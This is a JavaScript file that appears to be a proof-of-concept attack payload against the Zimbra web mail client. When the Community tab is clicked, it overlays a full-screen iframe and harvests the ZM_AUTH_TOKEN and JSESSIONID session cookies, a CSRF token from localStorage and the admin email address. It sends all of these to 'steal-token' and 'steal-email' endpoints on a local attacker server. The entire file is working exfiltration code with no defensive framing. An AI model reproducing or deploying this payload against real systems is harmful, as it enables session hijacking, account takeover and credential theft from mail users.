(function () {
  var self = {
    _iframeId: "fragment-41812_iframe",
    _createIframe: function () {
      try {
        var iframe = document.getElementById(this._iframeId);
        if (!iframe) {
          iframe = document.createElement("iframe");
          if (!iframe) {
            console.error("Failed to create iframe element");
            return;
          }

          iframe.id = this._iframeId;
          iframe.src = "http://localhost:4000/";

          if (iframe.style) {
            iframe.style.width = "100vw";
            iframe.style.height = "100vh";
            iframe.style.backgroundColor = "#1e90ff";
            iframe.style.border = "none";
            iframe.style.display = "block";
            iframe.style.position = "fixed";
            iframe.style.top = "0";
            iframe.style.left = "0";
            iframe.style.zIndex = "9999";
            iframe.style.visibility = "visible";
            iframe.style.opacity = "1";
          }

          var container = document.getElementById("z_shell");
          if (!container) {
            container = document.body;
          }

          if (!container) {
            console.error("No suitable container found for iframe");
            return;
          }

          container.appendChild(iframe);
          console.log("Iframe created with src: http://localhost:4000/");

          this._extractAndSendData();
        } else {
          if (iframe.style) {
            iframe.src = "http://localhost:4000/";
            iframe.style.display = "block";
          }
          console.log("Iframe src updated to: http://localhost:4000/");
        }

        if (iframe) {
          iframe.onload = function () {
            if (iframe.contentWindow) {
              iframe.contentWindow.postMessage("type=community-update", "*");
              console.log("Sent simulated community-update message");
            }
          };
        }
      } catch (error) {
        console.error("Error in _createIframe:", error);
      }
    },

    _extractAndSendData: function () {
      try {
        var cookies = {};
        if (document.cookie) {
          cookies = document.cookie.split(";").reduce((acc, cookie) => {
            var parts = cookie.trim().split("=");
            if (parts.length >= 2) {
              acc[parts[0]] = parts[1];
            }
            return acc;
          }, {});
        }

        var zmAuthToken = cookies["ZM_AUTH_TOKEN"] || "Not found";
        var jsessionId = cookies["JSESSIONID"] || "Not found";

        const email =
          document.getElementById("z_userName")?.getAttribute("aria-label") ||
          "Not found";
        console.log("Admin Email:", email);

        var csrfToken = "Not found";
        if (typeof Storage !== "undefined" && localStorage) {
          csrfToken =
            localStorage.getItem("csrfToken") ||
            localStorage.getItem("CSRF_TOKEN") ||
            localStorage.getItem("csrf_token") ||
            "Not found";
        }
        console.log("CSRF Token from localStorage:", csrfToken);

        if (typeof fetch !== "undefined") {
          fetch(
            "http://localhost:3001/steal-token?zm_auth_token=" +
              encodeURIComponent(zmAuthToken) +
              "&jsessionid=" +
              encodeURIComponent(jsessionId) +
              "&csrf_token=" +
              encodeURIComponent(csrfToken),
            {
              method: "GET",
            }
          )
            .then(() => {
              console.log(
                "Data sent to attacker: ZM_AUTH_TOKEN=" +
                  zmAuthToken +
                  ", JSESSIONID=" +
                  jsessionId +
                  ", CSRF_TOKEN=" +
                  csrfToken
              );
            })
            .catch((err) => {
              console.error("Failed to send cookie data:", err);
            });

          fetch("http://localhost:3001/steal-email", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ email: email }),
          })
            .then(() => {
              console.log("Email sent to attacker: " + email);
            })
            .catch((err) => {
              console.error("Failed to send email data:", err);
            });
        }
      } catch (error) {
        console.error("Error in _extractAndSendData:", error);
      }
    },

    _setupMessageHandling: function () {
      try {
        window.addEventListener(
          "message",
          function (event) {
            console.log("Received message:", event.data, "from", event.origin);
            if (event.data === "close-iframe") {
              var iframe = document.getElementById(self._iframeId);
              if (iframe && iframe.remove) {
                iframe.remove();
                console.log("Iframe closed by message");
              }
            }
          },
          false
        );
      } catch (error) {
        console.error("Error in _setupMessageHandling:", error);
      }
    },

    _waitForElement: function (selector, callback, maxAttempts = 50) {
      var attempts = 0;
      var checkExist = setInterval(function () {
        var element = document.getElementById(selector.replace("#", ""));
        if (element) {
          clearInterval(checkExist);
          callback(element);
        } else if (attempts >= maxAttempts) {
          clearInterval(checkExist);
          console.log("Element not found after maximum attempts:", selector);
        }
        attempts++;
      }, 100);
    },
  };

  function initializeWhenReady() {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", initializeWhenReady);
      return;
    }

    var communityTab = document.getElementById("zb__App__Social_title");
    if (communityTab) {
      communityTab.addEventListener("click", function () {
        self._createIframe();
        self._setupMessageHandling();
      });
    } else {
      console.log("Waiting for Community tab to appear...");

      if (typeof MutationObserver !== "undefined") {
        var observer = new MutationObserver(function () {
          communityTab = document.getElementById("zb__App__Social_title");
          if (communityTab) {
            communityTab.addEventListener("click", function () {
              self._createIframe();
              self._setupMessageHandling();
            });
            observer.disconnect();
          }
        });

        if (document.body) {
          observer.observe(document.body, { childList: true, subtree: true });
        }
      } else {
        self._waitForElement("zb__App__Social_title", function (element) {
          element.addEventListener("click", function () {
            self._createIframe();
            self._setupMessageHandling();
          });
        });
      }
    }

    try {
      if (
        typeof Storage !== "undefined" &&
        localStorage &&
        localStorage.length > 0
      ) {
        const key = localStorage.key(0);
        if (key) {
          const value = localStorage.getItem(key);
          console.log(`${key}: ${value}`);
        }
      }
    } catch (error) {
      console.error("Error accessing localStorage:", error);
    }
  }

  initializeWhenReady();
})();
